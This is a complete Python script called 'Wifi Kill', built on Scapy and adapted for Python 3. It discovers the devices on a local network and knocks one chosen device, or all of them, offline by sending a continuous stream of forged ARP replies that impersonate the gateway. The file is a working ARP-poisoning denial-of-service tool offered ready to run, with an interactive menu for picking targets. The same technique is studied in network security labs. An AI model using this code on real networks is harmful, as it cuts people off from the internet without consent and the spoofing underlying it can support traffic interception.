#!/usr/bin/env python3
"""
Wifi Kill
Robert Glew (adjusted for Python 3 & modern Scapy)

This script can be used to kick anyone or everyone off your Wi‑Fi network.
It must be run as root (sudo) in order to send the required packets.
"""

import os
import logging
import time
import ipaddress
import netifaces
import subprocess
import re
from scapy.all import arping, ARP, send, conf, get_if_hwaddr

# Silence Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0


def ping_sweep(ip_range):
    """Ping all hosts in ``ip_range`` to populate the ARP cache on Windows."""
    network = ipaddress.ip_network(ip_range, strict=False)
    for ip in network.hosts():
        cmd = ["ping", "-n", "1", "-w", "250", str(ip)]
        if os.name != "nt":
            cmd = ["ping", "-c", "1", "-W", "1", str(ip)]
        subprocess.run(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )


def parse_arp_cache():
    """Return ``(ip, mac)`` pairs from the local ARP cache."""
    output = subprocess.check_output(
        ["arp", "-a"], text=True, encoding="utf-8"
    )
    pairs = []
    for line in output.splitlines():
        match = re.search(
            r"(\d{1,3}(?:\.\d{1,3}){3})\s+([0-9a-fA-F:-]{17})",
            line,
        )
        if match:
            ip = match.group(1)
            mac = match.group(2).replace("-", ":").lower()
            pairs.append((ip, mac))
    return pairs


def get_ip_macs(ips, iface, timeout=2):
    """Return a list of ``(ip, mac)`` tuples for devices on the network."""
    if os.name == "nt":
        ping_sweep(ips)
        return parse_arp_cache()
    answers, _ = arping(ips, iface=iface, timeout=timeout, verbose=0)
    return [(r.psrc, r.hwsrc) for _, r in answers]


def poison(victim_ip, victim_mac, gateway_ip, src_mac):
    """Send ARP packet associating ``gateway_ip`` with ``src_mac``."""
    pkt = ARP(
        op=2,
        psrc=gateway_ip,
        hwsrc=src_mac,
        pdst=victim_ip,
        hwdst=victim_mac,
    )
    send(pkt, verbose=0)


def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Send ARP packet pairing ``gateway_ip`` with ``gateway_mac``."""
    pkt = ARP(
        op=2,
        psrc=gateway_ip,
        hwsrc=gateway_mac,
        pdst=victim_ip,
        hwdst=victim_mac,
    )
    send(pkt, verbose=0)


def print_divider():
    print('-' * 40)


def get_network_params():
    """Return interface, scan range and gateway IP."""
    iface = conf.iface
    gws = netifaces.gateways().get('default', {})
    gw = gws.get(netifaces.AF_INET)
    if gw:
        gateway_ip, iface = gw

    addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET)
    if not addrs:
        raise SystemExit(f"No IPv4 address found on interface {iface}")

    addr = addrs[0]['addr']
    mask = addrs[0].get('netmask', '255.255.255.0')
    network = ipaddress.IPv4Network(f"{addr}/{mask}", strict=False)
    ip_range = str(network)

    if not gw:
        gateway_ip = str(next(network.hosts()))

    return iface, ip_range, gateway_ip


def is_admin():
    """Return ``True`` if the script is running with administrative rights."""
    if os.name != "nt":
        return os.geteuid() == 0

    try:
        import ctypes  # imported only on Windows
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def check_root():
    """Exit the script if not executed with administrator privileges."""
    if not is_admin():
        raise SystemExit(
            "You need to run the script as root/sudo or with Administrator "
            "privileges."
        )


def main():
    check_root()

    # detect network parameters and our MAC address
    iface, ip_range, gateway_ip = get_network_params()
    src_mac = get_if_hwaddr(iface)

    print(f"Using interface {iface} with scan range {ip_range}")
    print_divider()

    refreshing = True
    gateway_mac = None

    while refreshing:
        # discover devices
        devices = get_ip_macs(ip_range, iface, timeout=4)

        print_divider()
        print("Connected devices:")
        for idx, (ip, mac) in enumerate(devices):
            print(f"{idx}) {ip}\t{mac}")
            if ip == gateway_ip:
                gateway_mac = mac
        print_divider()

        print(f"Assumed gateway IP: {gateway_ip}")
        if gateway_mac:
            print(f"Detected gateway MAC: {gateway_mac}")
        else:
            print("⚠️  Gateway MAC not found – cannot restore later!")
        print_divider()

        print("Who do you want to boot?")
        print("(r) Refresh, (a) Kill all, (q) Quit")

        choice = None
        while True:
            cmd = input("> ").strip().lower()
            if cmd == 'r':
                break
            if cmd == 'a':
                choice = 'a'
                refreshing = False
                break
            if cmd == 'q':
                return
            if cmd.isdigit() and 0 <= int(cmd) < len(devices):
                choice = int(cmd)
                refreshing = False
                break
            print("Enter a valid option (r, a, q or device number).")

    # launch the attack
    try:
        if choice == 'a':
            print("Killing ALL devices... (Ctrl+C to stop)")
            while True:
                for ip, mac in devices:
                    poison(ip, mac, gateway_ip, src_mac)
                time.sleep(2)

        else:
            victim_ip, victim_mac = devices[choice]
            print(
                f"Preventing {victim_ip} from accessing the internet... "
                "(Ctrl+C to stop)"
            )
            while True:
                poison(victim_ip, victim_mac, gateway_ip, src_mac)
                time.sleep(2)

    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        if choice == 'a':
            for ip, mac in devices:
                if gateway_mac:
                    restore(ip, mac, gateway_ip, gateway_mac)
        else:
            if gateway_mac:
                restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        print("Done. You're welcome!")


if __name__ == "__main__":
    main()
